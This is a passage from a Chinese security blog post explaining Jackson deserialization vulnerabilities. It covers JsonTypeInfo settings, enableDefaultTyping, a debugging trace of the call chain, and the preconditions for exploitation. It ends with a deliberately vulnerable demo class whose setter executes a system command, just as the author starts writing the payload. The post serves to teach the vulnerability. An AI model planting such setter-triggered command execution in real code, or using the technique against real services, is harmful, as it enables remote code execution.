</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span>  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，和没有设置值为 <code>JsonTypeInfo.Id.NONE</code> 的 <code>@JsonTypeInfo</code> 注解是一样的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> <span class="punctuation">&#123;</span>skill=hiphop<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/ld_none_result.png" class><h4 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h4><p>修改 Person2 类中的 object 属性 <code>@JsonTypeInfo</code> 注解值为 <code>JsonTypeInfo.Id.CLASS</code></p><p>输出看到，object属性中多了 <code>&quot;@class&quot;:&quot;com.drunkbaby.Hacker&quot;</code> ，即含有具体的类的信息，同时反序列化出来的object属性Hacker类对象，即能够成功对指定类型进行序列化和反序列化：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.Hacker@<span class="number">55</span>f3ddb1</span><br></pre></td></tr></table></figure><p>也就是说，在Jackson反序列化的时候如果使用了<code>JsonTypeInfo.Id.CLASS</code>修饰的话，可以通过@class的方式指定相关类，并进行相关调用。</p><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>修改 Person2 类中的object属性 <code>@JsonTypeInfo</code> 注解值为 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code></p><p>输出看到，object属性中多了 <code>&quot;@c&quot;:&quot;com.drunkbaby.Hacker&quot;</code>，即使用 @c 替代了 @class，官方描述中的意思是缩短了相关类名，实际效果和 JsonTypeInfo.Id.CLASS 类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;drunkbaby&quot;</span><span class="punctuation">,</span><span class="attr">&quot;object&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@c&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.drunkbaby.Hacker&quot;</span><span class="punctuation">,</span><span class="attr">&quot;skill&quot;</span><span class="punctuation">:</span><span class="string">&quot;hiphop&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.Hacker@<span class="number">18</span>be83e4</span><br></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>修改 Person2 类中的object属性 <code>@JsonTypeInfo</code> 注解值为 <code>JsonTypeInfo.Id.NAME</code></p><p>输出看到，object 属性中多了 <code>&quot;@type&quot;:&quot;Hacker&quot;</code>，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/errorName.png" class><h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>由前面测试发现，当 <code>@JsonTypeInfo</code> 注解设置为如下值之一并且修饰的是 Object 类型的属性时，可以利用来触发 Jackson 反序列化漏洞：</p><ul><li>JsonTypeInfo.Id.CLASS</li><li>JsonTypeInfo. Id. MINIMAL_CLASS</li></ul><h2 id="0x03-反序列化中类属性方法的调用"><a href="#0x03-反序列化中类属性方法的调用" class="headerlink" title="0x03 反序列化中类属性方法的调用"></a>0x03 反序列化中类属性方法的调用</h2><p>这里只针对 Jackson 反序列化过程中存在的一些方法调用进行分析，并且只针对应用 JacksonPolymorphicDeserialization 机制的场景进行分析。</p><p>下面简单看下两个实现方式间是否有区别。</p><h3 id="当使用-DefaultTyping-时"><a href="#当使用-DefaultTyping-时" class="headerlink" title="当使用 DefaultTyping 时"></a>当使用 DefaultTyping 时</h3><p>新增 Person3 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 MySex 类中的方法中添加输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySex2</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MySex2</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.getSex&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.setSex&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改反序列化代码，只进行反序列化操作并调用无参数的 <code>enableDefaultTyping()</code> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">            <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">            mapper.enableDefaultTyping();  </span><br><span class="line">  </span><br><span class="line">            <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.deserialization.MySex2\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">            <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">            System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，看到调用了目标类的构造函数和 setter 方法：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializationTest.png" class><h3 id="当使用-JsonTypeInfo-注解时"><a href="#当使用-JsonTypeInfo-注解时" class="headerlink" title="当使用 @JsonTypeInfo 注解时"></a>当使用 @JsonTypeInfo 注解时</h3><p>修改 Person3 类，在 sex 属性前添加注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span>  </span><br><span class="line">    <span class="comment">// 或 @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)  </span></span><br><span class="line">    <span class="keyword">public</span> Sex sex;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, sex == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : sex);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改 DeserializationTest2. java，注释掉 enableDefaultTyping ()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest2</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line"><span class="comment">//        mapper.enableDefaultTyping();  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;drunkbaby\&quot;,\&quot;sex\&quot;:[\&quot;com.drunkbaby.deserialization.MySex2\&quot;,&#123;\&quot;sex\&quot;:1&#125;]&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person3</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person3.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，和使用 DefaultTyping 是一样的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySex构造函数</span><br><span class="line">MySex.setSex</span><br><span class="line">Person.age=<span class="number">6</span><span class="punctuation">,</span> Person.name=drunkbaby<span class="punctuation">,</span> com.drunkbaby.deserialization.MySex2@<span class="number">6</span>a2bcfcb</span><br></pre></td></tr></table></figure><h3 id="Jackson-反序列化调试分析"><a href="#Jackson-反序列化调试分析" class="headerlink" title="Jackson 反序列化调试分析"></a>Jackson 反序列化调试分析</h3><p>Jackson 反序列化的过程其实就分为两步，第一步是通过构造函数生成实例，第二部是设置实例的属性值。</p><p>这里以第一个例子来进行 Jackson 反序列化过程的调试分析，在 <code>Person p2 = mapper.readValue(json, Person.class);</code> 处打上断点，同时在 MySex2 类的构造函数、getter、setter 方法中设置断点，然后开始调试</p><p>另外，为了方便，给 Person3 类加上个构造函数，随后开始调试</p><p>首先反序列化跟进来，在 <code>com.fasterxml.jackson.databind.ObjectMapper._readMapAndClose()</code> 方法这里，先进行 <code>JsonToken</code> 的初始化，随后进行进一步的反序列化操作。</p><p>当初始化是第一次的时候，会先调到 <code>com.fasterxml.jackson.databind.deser.BeanDeserializer#vanillaDeserialize()</code> 方法</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/vanillaDeserialize.png" class><p>跟进，<code>vanillaDeserialize()</code> 方法调用了 <code>createUsingDefault()</code> 方法，这个方法的作用是调用指定类的无参构造函数，生成类实例。</p><p>再次跟进就是调用 <code>call()</code> 方法了</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/call.png" class><p>走到了构造函数</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/constructor.png" class><p>在初始化完毕之后，会调用 <code>deserializeAndSet()</code> 方法，完成了一个嵌套的过程，具体的细节后面会讲。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeAndSetFirst.png" class><p>跟进去之后会发现这里调用了 <code>this.deserialize()</code> 方法，跟进 <code>deser.deserialize()</code>，具体的业务逻辑是在 <code>com.fasterxml.jackson.databind.deser.BeanDeserializer#deserializeAndSet()</code> 方法执行的，实际上就是我们前面说的 <strong>Jackson 反序列化的过程其实就分为两步，第一步是通过构造函数生成实例，第二部是设置实例的属性值。</strong> 跟进</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeAndSet.png" class><p>继续跟进 <code>this.deserialize()</code>，这里先拿了 json 数据的数据类型，接下来判断这个节点的数据类型是否为 null，如果不为 null，再判断 <code>this._valueTypeDeserializer</code> 是否为空，如果不为空则继续调用 <code>this._valueDeserializer.deserialize()</code> 方法</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/businessDeser.png" class><p>这里 t 是存在的，且反序列化程序也是存在的，所以调用 <code>deserialize()</code> 方法</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/judgeDeserialize.png" class><p>判断是否为 <code>VALUE_NUMBER_INT</code>，如果是则跟进 <code>getIntValue()</code> 方法，如果不是则跟进 <code>_parseInteger()</code> 方法，这里最终整个调完之后，会返回 json 键值对中的值</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/objectValue.png" class><p>随后的 <code>this._field.set(instance, value);</code> 意思就是调用对应类的 setter 方法了，进行赋值。因为这里我们没有写 Person3 这个类的 setter 方法，如果实现了 setter 方法，则代码逻辑会走进去。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/invokeForSetter.png" class><p>在调用完成之后又会重新回到 <code>BeanDeserializer.vanillaDeserialize()</code>  函数中的 do while 循环，继续获取值，继续调用，达到递归的效果。</p><p>不太一样的是在 <code>SettableBeanProperty.deserialize()</code>  函数中进入到了调用 <code>deserializeWithType()</code> 函数解析的代码逻辑，因为此时 <code>_valueTypeDeserializer</code> 值不为 null：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/diffDeserialize.png" class><p>往下，先判断反序列化的类型，因为这里是数组，所以会返回 null，再跟进 <code>deserializeTypedFromObject()</code> 方法</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedFromObject.png" class><p>同样因为是数组，跟进 <code>_deserializeTypedUsingDefaultImpl()</code> 方法</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedUsingDefaultImpl.png" class><p>随后寻找反序列化的类</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/findDefaultImplDeserializer.png" class><p>因为这里的数据类型是数组，不匹配任意一项，所以最后调用了 <code>deserializeTypedFromAny()</code> 方法，这个方法最终是让程序去已有的类里面找，很明显这里找的是 <code>com.drunkbaby.deserialization.MySex2</code> 类</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/deserializeTypedFromAny.png" class><p>跟进去，其中调用 <code>findContextualValueDeserializer()</code> 找到 typeId 类型对应的反序列化器，然后缓存到 <code>_deserializers</code> 这个 Map 变量中，然后返回该反序列化器</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/putTypeID.png" class><p>接着程序回到数组类型解析的 <code>AsArrayTypeDeserializer._deserialize()</code> 函数中往下执行，用刚刚获取到的反序列化器来解析 sex 属性中数组内的具体类型实例：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/finaldeserialize.png" class><p>这里的逻辑比较简单，判断目前这个数据类型是否已经有对应的反序列化处理器了，如果没有则最终还是走原来那一套，如果有的话则走 Jackson 自己的规则。</p><p>至于后续的逻辑和最开始的反序列化逻辑是很类似的，简单看一下关键部分的调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;: <span class="number">8</span>, MySex2 (com. drunkbaby. deserialization)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">423</span>, Constructor (java.lang.reflect)</span><br><span class="line">call:<span class="number">119</span>, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createUsingDefault:<span class="number">243</span>, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">vanillaDeserialize:<span class="number">249</span>, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:<span class="number">125</span>, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:<span class="number">110</span>, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br></pre></td></tr></table></figure><p>后续过程就不再展开了，是相似的调用过程。</p><p>至此，整个函数调用过程大致过了一遍。使用@JsonTypeInfo 注解的函数调用过程也是一样的。</p><ul><li>简单梳理一遍，Jackson 反序列化的过程为，先调用通过无参的构造函数生成目标类实例，接着是根据属性值是否是数组的形式即是否带类名来分别调用不同的函数来设置实例的属性值，其中会调用 Object 类型属性的构造函数和 setter 方法。</li></ul><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p><strong>在 Jackson 反序列化中，若调用了 <code>enableDefaultTyping()</code> 函数或使用 <code>@JsonTypeInfo</code> 注解指定反序列化得到的类的属性为 <code>JsonTypeInfo.Id.CLASS</code> 或 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code>，则会调用该属性的类的构造函数和 setter 方法。</strong></p><h2 id="0x04-Jackson-反序列化漏洞"><a href="#0x04-Jackson-反序列化漏洞" class="headerlink" title="0x04 Jackson 反序列化漏洞"></a>0x04 Jackson 反序列化漏洞</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>满足下面三个条件之一即存在Jackson反序列化漏洞：</p><ul><li>调用了 <code>ObjectMapper.enableDefaultTyping()</code> 函数；</li><li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li><li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li></ul><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由之前的结论知道，当使用的 JacksonPolymorphicDeserialization 机制配置有问题时，Jackson 反序列化就会调用属性所属类的构造函数和 setter 方法。</p><p>而如果该构造函数或 setter 方法存在危险操作，那么就存在 Jackson 反序列化漏洞。</p><h3 id="漏洞场景及-Demo"><a href="#漏洞场景及-Demo" class="headerlink" title="漏洞场景及 Demo"></a>漏洞场景及 Demo</h3><p>这里大致以要进行反序列化的类的属性所属的类的类型分为两种：</p><h4 id="属性不为Object类时"><a href="#属性不为Object类时" class="headerlink" title="属性不为Object类时"></a>属性不为Object类时</h4><p><strong>当要进行反序列化的类的属性所属类的构造函数或 setter 方法本身存在漏洞时，这种场景存在 Jackson 反序列化漏洞。当然这种场景开发几乎不会这么写。</strong></p><p>我们看个例子，直接修改 MySex 类的 setSex ()方法，在其中添加命令执行操作（除非程序员自己想留后门、不然不会出现这种写法）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilSex</span> <span class="keyword">implements</span> <span class="title class_">Sex</span> &#123;  </span><br><span class="line">    <span class="type">int</span> sex;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MySex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.getSex&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> sex;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">int</span> sex)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;MySex.setSex&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.sex = sex;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Peson3 类不变</p><p>编写反序列化类，构造 Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 